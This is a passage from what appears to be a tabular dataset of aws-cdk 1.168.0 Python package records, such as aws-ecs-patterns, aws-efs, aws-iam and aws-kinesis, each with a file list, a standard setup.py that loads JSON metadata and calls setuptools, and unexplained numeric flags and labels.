        ""aws_cdk.aws_ecs._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ecs._jsii"": [
            ""aws-ecs@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ecs"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-autoscaling-hooktargets==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecr-assets==1.168.0"",
        ""aws-cdk.aws-ecr==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancing==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-route53-targets==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-secretsmanager==1.168.0"",
        ""aws-cdk.aws-servicediscovery==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-ecs-patterns-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ecs-patterns@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ecs-patterns"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ECS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ecs_patterns"",
        ""aws_cdk.aws_ecs_patterns._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ecs_patterns._jsii"": [
            ""aws-ecs-patterns@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ecs_patterns"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecs==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-events-targets==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-route53-targets==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-servicediscovery==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-efs-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-efs@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-efs"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::EFS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_efs"",
        ""aws_cdk.aws_efs._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_efs._jsii"": [
            ""aws-efs@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_efs"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-eks-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-eks@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-eks"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::EKS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_eks"",
        ""aws_cdk.aws_eks._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_eks._jsii"": [
            ""aws-eks@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_eks"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""aws-cdk.lambda-layer-awscli==1.168.0"",
        ""aws-cdk.lambda-layer-kubectl==1.168.0"",
        ""aws-cdk.lambda-layer-node-proxy-agent==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-elasticloadbalancing-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-elasticloadbalancing@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-elasticloadbalancing"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ElasticLoadBalancing"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_elasticloadbalancing"",
        ""aws_cdk.aws_elasticloadbalancing._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_elasticloadbalancing._jsii"": [
            ""aws-elasticloadbalancing@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_elasticloadbalancing"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-elasticloadbalancingv2-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-elasticloadbalancingv2@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-elasticloadbalancingv2"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ElasticLoadBalancingV2"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_elasticloadbalancingv2"",
        ""aws_cdk.aws_elasticloadbalancingv2._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_elasticloadbalancingv2._jsii"": [
            ""aws-elasticloadbalancingv2@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_elasticloadbalancingv2"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-events-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-events@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-events"",
    ""version"": ""1.168.0"",
    ""description"": ""Amazon EventBridge Construct Library"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_events"",
        ""aws_cdk.aws_events._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_events._jsii"": [
            ""aws-events@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_events"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-events-targets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-events-targets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-events-targets"",
    ""version"": ""1.168.0"",
    ""description"": ""Event targets for Amazon EventBridge"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_events_targets"",
        ""aws_cdk.aws_events_targets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_events_targets._jsii"": [
            ""aws-events-targets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_events_targets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-apigateway==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-codebuild==1.168.0"",
        ""aws-cdk.aws-codepipeline==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecs==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-kinesisfirehose==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-sns-subscriptions==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.aws-stepfunctions==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-globalaccelerator-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-globalaccelerator@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-globalaccelerator"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::GlobalAccelerator"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_globalaccelerator"",
        ""aws_cdk.aws_globalaccelerator._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_globalaccelerator._jsii"": [
            ""aws-globalaccelerator@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_globalaccelerator"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-glue-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-glue@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-glue"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Glue"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_glue"",
        ""aws_cdk.aws_glue._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_glue._jsii"": [
            ""aws-glue@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_glue"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.assets==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-iam-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-iam@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-iam"",
    ""version"": ""1.168.0"",
    ""description"": ""CDK routines for easily assigning correct and minimal IAM permissions"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_iam"",
        ""aws_cdk.aws_iam._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_iam._jsii"": [
            ""aws-iam@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_iam"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-kinesis-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-kinesis@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-kinesis"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Kinesis"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_kinesis"",
        ""aws_cdk.aws_kinesis._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_kinesis._jsii"": [
            ""aws-kinesis@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_kinesis"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
